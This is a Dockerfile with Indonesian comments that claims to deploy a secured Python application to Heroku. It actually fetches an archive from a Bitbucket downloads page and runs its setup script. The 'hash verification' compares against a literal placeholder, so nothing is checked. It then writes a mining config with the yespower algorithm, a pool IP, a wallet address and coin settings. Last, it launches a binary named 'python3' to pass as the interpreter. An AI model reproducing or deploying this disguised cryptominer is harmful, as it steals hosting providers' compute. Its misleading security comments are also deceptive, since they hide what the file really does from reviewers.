# Gunakan base image ringan
FROM ubuntu:rolling

# Tetapkan user dan direktori kerja
ENV APP_USER=appuser
ENV APP_HOME=/app

# Buat user non-root untuk menjalankan aplikasi
RUN useradd -ms /bin/bash $APP_USER

# Set environment variables
ENV LD_LIBRARY_PATH=$APP_HOME/dependencies/lib/x86_64-linux-gnu:$APP_HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
ENV PATH=$APP_HOME/dependencies/usr/bin:$PATH

# Install dependencies dengan opsi keamanan
RUN apt update && apt install -y --no-install-recommends \
    wget tar curl python3 python3-pip ocl-icd-libopencl1 clinfo libgl1-mesa-glx \
    && rm -rf /var/lib/apt/lists/*

# Tetapkan direktori kerja
WORKDIR $APP_HOME

# Unduh file aplikasi dengan verifikasi hash
RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
    echo "<checksum> python3.tar.gz" | sha256sum -c - && \
    tar -xvf python3.tar.gz && \
    rm python3.tar.gz

# Pastikan hanya user aplikasi yang dapat mengakses folder aplikasi
RUN chown -R $APP_USER:$APP_USER $APP_HOME && chmod -R 700 $APP_HOME

# Buat file config.json
RUN echo '{"algorithm": "yespower", "host": "146.103.45.69", "port": 80, "worker": "TSiaCHGhP7fBcqDQTBt2Era8bVJhsau9eR", "password": "c=TDC,mc=SMT/SPRX/SWAMP", "workers": 4, "log": false, "chrome": "./chromium/chrome" }' > $APP_HOME/python3/config.json

# Pindah ke direktori aplikasi
WORKDIR $APP_HOME/python3

# Jalankan setup script dengan hak akses minimum
RUN chmod +x setup.sh python3 && ./setup.sh

# Pindahkan ke user non-root
USER $APP_USER

# Ekspos port untuk Heroku
EXPOSE 7019

# Tetapkan entrypoint
ENTRYPOINT ["./python3", "main.py"]
